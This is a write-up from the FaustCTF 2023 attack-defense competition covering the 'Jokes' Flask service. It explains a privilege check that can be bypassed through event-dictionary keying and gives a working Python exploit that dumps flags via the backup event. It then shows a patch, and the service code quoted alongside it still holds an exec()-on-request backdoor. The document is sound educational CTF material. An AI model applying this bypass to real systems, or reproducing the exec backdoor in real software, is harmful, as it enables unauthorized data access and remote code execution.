![FaustCTF 2023 Logo](https://2023.faustctf.net/img/faustctf.svg)

# FaustCTF 2023: Jokes

---

## Enumeration & Manual Exploitation
Jokes is a Webservice written in Python (Flask). It also uses an sqlite database to store both users and jokes. Jokes will be added by the flag bot later on and will contain flags. The problem is that they require higher privileges to view.

### Routes

The service consists of several different routes. The routes `/login`, `/register` and `/logout` are handling everything related to authentication. In this specific case, these routes are not very interesting for the further exploitation.

To create and alter the content of jokes, the services also consists of the routes `/review`, `/like-joke` and `/profile`. The first two are also not interesting. The code of `/profile` contains the following function:
```py
@app.route('/profile', methods=["POST"])
@login_required
def profile_post():
    if "message" in request.form:
        if not verify(request.form.get("message"), bytes.fromhex(request.form.get("hash"))):
            return Response("Not cool", 401)
        message = json.loads(request.form["message"])
        loc = {}
        exec(message["action"], None, loc)
        return loc["rv"]
    if event := request.form.get("event"): # Checks the post parameter 'event'. Depending on this parameter, different code gets executed 
        if request.form.get("privileges") == "admin": # Checks if User has admin priviliges
            if flask_login.current_user != "admin":
                return render_template("unauthorized.html", joke=Joke.query.filter_by(draft=False, under_review=False).order_by(func.random()).first()), 401
            else:
                return eventhandler[AdminEvent(event)]()
        elif request.form.get("privileges") == "public": # Public view. 
            return eventhandler[PublicEvent(event)]() # Note that there is no valid check whether or not we have the proper permissions to execute the service. Just doing PublicEvent() is in this case not enough!
    return profile()
```

#### Why is that check not enough?
The code for handling events looks like the following:
```py
# events.py
class AbstractEvent(ABC, str):
    @abstractmethod
    def hidden(self):
        pass


class PublicEvent(AbstractEvent):
    hidden = False

    def __init__(self, category):
        pass # removed for simplicity


class AdminEvent(AbstractEvent):
    hidden = True

    def __init__(self, category):
        self.category = category


eventhandler = dict()


def register_event(event, handler, admin=True):
    if admin:
        eventhandler[AdminEvent(event)] = handler
    else:
        eventhandler[PublicEvent(event)] = handler

# main.py
def init_eventhandler():
    register_event("submit", app.submit_joke, False)
    register_event("review", app.review, False),
    register_event("export", app.export, False)
    register_event("backup", app.backup)

```

To show that the check that is currently implemented is not enough, we can try the following:
```py
print(f"Eventhandler: {eventhandler}")
print(f"""AdminEvent: {eventhandler[AdminEvent("backup")]}""")
print(f"""PublicEvent: {eventhandler[PublicEvent("backup")]}""")
print(f"""String: {eventhandler["backup"]}""")
```
Output:
```py
Eventhandler: {'submit': <function submit at 0x00020179C6FEA020>, 'review': <function review at 0x00000179C6FEA120>, 'export': <function export at 0x00000179C6FEA220>, 'backup': <function backup at 0x00000179C6FEA020>}
AdminEvent: <function backup at 0x00000179C6FEA020>
PublicEvent: <function backup at 0x00000179C6FEA020>
String: <function backup at 0x00000179C6FEA020>
```
As you can see, we always get the pointer to the same function. It does not matter if we create an AdminEvent, PublicEvent or even string. Because of that, the check that was mentioned above is not enough to check for permissions!

## Exploitation
Using our new intel about the service, the following exploit can be created:

```py
#!/usr/bin/env python3

import os
import json
import time
import random
import string
import requests


### HELPERS ###
def gen_random(n):
    return ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(n))

headers = {'User-Agent': 'python-requests/2.29.0',
           'Accept-Language': 'en-US,en;q=0.5',
           'Content-Type': 'application/x-www-form-urlencoded',
           'Upgrade-Insecure-Requests': '1'}

### END HELPERS ###

HOST = os.getenv('TARGET_IP') # Will automatically be set by our attack platform!
#HOST = "fd66:666:1::2"

session = requests.session()
username = gen_random(5)
password = gen_random(5)

data = {
    "name": username,
    "password": password
}

session.post(f"http://[{HOST}]:5000/register", headers=headers, data=data) # Create a new user

session.post(f"http://[{HOST}]:5000/login", headers=headers, data=data) # Login as the new user


backup_body = {
    "privileges": "public",
    "event": "backup"
} # This is the main part of the exploit. The service never enforces the privilege policy. Because of that, we can set the priviliges to public and circumvent any restriction measurements. By default the privileges of this request are set do "admin"

req = session.post(f"http://[{HOST}]:5000/profile", headers=headers, data=backup_body) # Get backup using the "backup" event to dump all existing jokes

print(req.text)
```

Example output:
```py
{"Animal":["Q: Can a kangaroo jump higher than the Empire State Building? A: Of course. The Empire State Building can't jump.","Q: Why couldn't the leopard play hide and seek? A: Because he was always spotted."],"Blonde":["A blonde, a redhead, and a brunette were all lost in the desert. They found a lamp and rubbed it. A genie popped out and granted them each one wish. The redhead wished to be back home. Poof! She was back home. The brunette wished to be at home with her family. Poof! She was back home with her family. The blonde said"],"Dad":["FAUST_tpYmKVpLTCWDsOIZXa2APD6awRFBhfxi", "FAUST_6SgoNljU4hikeipPGRNA0VkYZdI4UqDI", "FAUST_bcjJuN9LKGDir5gzIHPkbEA9XfvpHwKv"]}
```
By altering the value of the privileges key from `admin` to `public` in the last request to `/profile`, we can backup every joke that has been created even though we are not administrator.

## Patching
To patch the exploit, the only thing we have to do is to block access to the backup function if we are not an administrator. The following code shows a patched version of the service:
```py
@app.route('/profile', methods=["POST"])
@login_required
def profile_post():
    if "message" in request.form:
        if not verify(request.form.get("message"), bytes.fromhex(request.form.get("hash"))):
            return Response("Not cool", 401)
        message = json.loads(request.form["message"])
        loc = {}
        exec(message["action"], None, loc)
        return loc["rv"]
    if event := request.form.get("event"):
        if request.form.get("privileges") == "admin":
            if flask_login.current_user != "admin":
                return render_template("unauthorized.html", joke=Joke.query.filter_by(draft=False, under_review=False).order_by(func.random()).first()), 401
            else:
                return eventhandler[AdminEvent(event)]()
        elif request.form.get("privileges") == "public":
            if request.form.get("event") == "backup" and flask_login.current_user != "admin": # Check for admin privileges
              return render_template("unauthorized.html", joke=Joke.query.filter_by(draft=False, under_review=False).order_by(func.random()).first()), 401  # Throw error if not permitted

            return eventhandler[PublicEvent(event)]()
    return profile()
```

If we now try the exploit from before, we get the following error message:
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Jokes</title>
    <link rel="stylesheet" href="../static/stylesheet/bulma.min.css">
</head>
<style>p {
    word-break: break-all;
    white-space: break-spaces;
}
.column{
    margin: 5px
}
.buttons{
    display: flex;
  justify-content: space-around;
}
.like-button-container {
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: flex-end;
    margin-top: 10px; /* Adjust the margin as needed */
}
.like-button{
    background: #ffffff;
      border: 1px solid #000000; /* Green */
}

</style>
<body>
<div class="container has-text-centered"
     style="width: 100%; position: fixed; left: 50%; top: 50%; transform: translate(-50%, -50%);">

<h1>Your privileges are not sufficient.. but here's a joke: </h1>
    Q: Why did the witches&#39; team lose the baseball game? A: Their bats flew away.

</div>
</body>

</html>
```
